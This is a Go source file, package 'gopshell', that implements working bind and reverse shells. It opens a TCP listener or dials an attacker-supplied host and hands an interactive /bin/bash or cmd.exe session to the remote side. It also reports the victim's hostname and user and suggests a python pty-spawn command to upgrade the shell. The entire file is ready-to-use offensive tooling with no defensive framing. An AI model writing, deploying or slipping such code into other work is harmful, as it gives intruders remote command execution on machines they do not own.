package gopshell

import (
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
	"runtime"
)

func RunShellCmd(mode string, host string, port string) {
	fmt.Println("[+] Start the shell as mode :", mode)

	if mode == "bind" {
		bindShell(host, port)
	}
	if mode == "reverse" {
		reverseShell(host, port)
	}

}

func bindShell(host string, port string) {
	address := fmt.Sprintf("%s:%s", host, port)
	fmt.Println("[+] Binding to ", address)
	listener, err := net.Listen("tcp", address)
	if err != nil {
		log.Fatal("[!] Unable to bind the address")
	}
	defer listener.Close()

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Println(err)
		}
		fmt.Printf("[+] Accepting connection from %s\n", conn.RemoteAddr().String())
		go runShell(conn)
	}

}

func reverseShell(host string, port string) {

	address := fmt.Sprintf("%s:%s", host, port)
	fmt.Println("[+] Address ", address)

	conn, err := net.Dial("tcp", address)
	if err != nil {
		log.Fatal("[!] Unable to dial the address")
	}
	defer conn.Close()

	runShell(conn)
}

func runShell(conn net.Conn) {
	r, w := io.Pipe()

	cmd := exec.Command("/bin/bash", "-i")

	go io.Copy(conn, r)

	// Get System information
	hostname, _ := exec.Command("hostname").Output()
	whoami, _ := exec.Command("whoami").Output()

	fmt.Fprintf(w, "\n[+] Hostname : %s", hostname)
	fmt.Fprintf(w, "[+] Whoami : %s", whoami)

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe")
		path, err := exec.LookPath("powershell")
		if err == nil {
			fmt.Fprintf(w, "\n[+] Powershell is installed\n[+] Run : %s\n\n", path)
		}
	} else {
		path, err := exec.LookPath("python")
		if err == nil {
			fmt.Fprintf(w, "\n[+] Python is installed\n[+] Run : %s %s\n\n", path, "-c \"import pty; pty.spawn('/bin/bash')\"")
		}
	}

	cmd.Stdin = conn
	cmd.Stdout = w
	cmd.Stderr = w

	if err := cmd.Run(); err != nil {
		fmt.Println(err)
	}
	conn.Close()
}
